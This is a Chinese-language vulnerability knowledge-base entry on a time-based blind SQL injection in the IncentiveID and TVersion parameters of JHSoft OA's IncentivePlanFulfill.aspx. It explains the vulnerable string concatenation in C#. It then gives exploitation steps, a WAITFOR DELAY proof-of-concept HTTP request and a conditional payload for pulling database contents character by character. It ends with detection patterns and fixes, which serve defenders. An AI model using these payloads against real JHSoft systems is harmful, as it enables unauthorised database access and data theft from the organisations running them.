---
id: web-generic-sqli-jhsoft-incentiveplan-fulfill-incentiveid-version
title: JHSoft OA IncentivePlanFulfill.aspx 的 IncentiveID/TVersion 直拼 MSSQL：延时注入
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-aspx-querystring-numeric-concat-mssql-time-blind
aliases:
- JHSoft SQL注入
- 金和 OA SQL注入
- IncentivePlanFulfill.aspx 注入
- IncentiveID 参数注入
- TVersion 参数注入
- WAITFOR DELAY 延时注入
tags:
- sqli
- dotnet
- aspx
- mssql
- time-based
- oa
- jhsoft
- string-concat
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:19+08:00'
  notes: 已对照原文与 img/01-05、10 核对 Page_Load 读取 IncentiveID/TVersion、GetIncentivePlanMessageById 拼接 where、GetIncentiveList strWhere 直拼，以及 WAITFOR DELAY 响应 5,233ms。未验证点：未复跑取数；原文未标受影响版本；请求需有效 ASP.NET_SessionId。
---

## 一句话结论

JHSoft OA 的 `IncentivePlanFulfill.aspx` 把 QueryString 中的 `IncentiveID`、`TVersion` 原样传给 DAL 的 `GetIncentivePlanMessageById`，后者用字符串拼接生成 `where IncentiveID=<值> and IncentiveVersion=<值>`；请求 `IncentiveID=1 WAITFOR DELAY '0:0:5'--` 可让页面稳定延迟约 5 秒，确认 MSSQL 时间盲注。

## 原理

- 入口 `Page_Load`：`TPlanID = string.Format("{0}", base.Request.QueryString["IncentiveID"])`、`TVersion = base.Request.QueryString["TVersion"]`；只判断 `TPlanID == ""`，随后调用 `GetPlanInfoInit()` 进入业务查询。
- 数据访问层 `GetIncentivePlanMessageById(string TPlanID, string TVersion)` 用 `StringBuilder.Append(" where IncentiveID=" + TPlanID + " and IncentiveVersion=" + TVersion)` 拼接 SQL，再交给 `Conn.ExecSQLReDataTable(...)` 执行。
- 两个参数处于数值上下文，代码没有 `int.Parse`、类型校验或参数化查询，单引号/空格/注释符都能原样进入 SQL；`IncentiveID=1 WAITFOR DELAY '0:0:5'--` 会把后面的 `and IncentiveVersion=...` 注释掉，数据库执行延时函数，HTTP 响应被拖慢。
- 同类的 `GetIncentiveList(string strWhere)` 同样使用 `" where DelFlag=0 and " + strWhere` 直拼；凡是把请求参数拼进 `strWhere` 的调用点都存在同一类注入。
- 页面开头执行 `KeyCtrl1("PDCAIncentive")` 并读取 `Session["UserCode"]`，说明有会话/权限控制；文章的复现请求带 `ASP.NET_SessionId`，因此按“登录后可达”对待，不宣称匿名。

## 触发条件

- 目标存在 JHSoft OA 的 `C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx`。
- `IncentiveID`、`TVersion` 进入上述 DAL 拼接 SQL，且未被 WAF 拦截。
- 数据库为 MSSQL（`WAITFOR` 可用），连接账号有执行权限。
- 时间盲注要求网络延迟稳定，最好先用正常请求测基线。

## 利用步骤

1. 请求 `?IncentiveID=1&TVersion=1`，记录正常响应时间作为基线。
2. 请求 `?IncentiveID=1 WAITFOR DELAY '0:0:5'--&TVersion=1`（空格 URL 编码为 `%20`），观察响应是否稳定增加约 5 秒。
3. 确认注入后把延时换成条件表达式，例如 `1;IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:3'--`，逐位提取库名、表名、字段与数据。
4. 同一页面中的 `GetAppFlagById(TPlanID, TVersion)` 调用点（`Convert.ToInt32(type = incentivePlan2.GetAppFlagById(TPlanID, TVersion))`）按同样模式测试；若页面有回显，可优先尝试报错/联合注入。

## PoC

```http
GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx?IncentiveID=1%20WAITFOR%20DELAY%20'0:0:5'--&TVersion=1 HTTP/1.1
Host: target.example
Cookie: ASP.NET_SessionId=<有效会话>
```

```text
# 文章实测响应：HTTP/1.1 200 OK，耗时 5,233 millis；正常请求为毫秒级
# 说明 WAITFOR DELAY 已进入 SQL 执行，而不是网络抖动
```

## 变体与关联

- 变体：`GetIncentiveList(strWhere)` 的 `" where DelFlag=0 and " + strWhere`，以及同 DAL 类中其他 `Append("... " + 参数)` 的查询，均为同一模式。
- 变体：页面渲染查询结果时改用布尔/联合注入；无回显时使用时间盲注。
- 关联：[[web-generic-sqli-eis-down-aspx-i-param-mssql]]（OA `.aspx` 下载接口参数直拼 MSSQL 的延时注入）；[[web-generic-sqli-dongsheng-logistics-multi-entry-concat]]（多入口字符串拼接注入）。
- 边界：文章只验证了延时注入，未演示取数、堆叠或命令执行；原文未标注受影响版本。

## 检测与防御

- 检测：请求参数出现 `WAITFOR`、`DELAY`、`--`、`IF(` 等特征；`IncentivePlanFulfill.aspx` 出现异常长耗时；应用日志出现拼接后的 SQL 文本。
- 修复：`IncentiveID`、`TVersion` 强制转为整数并使用参数化查询（`@IncentiveID`、`@IncentiveVersion`）；`GetIncentiveList` 的 `strWhere` 改为枚举条件或参数化，不允许调用方拼接 SQL 片段。
- 加固：数据库账号最小权限；对返回时间异常与高频注入特征做告警。
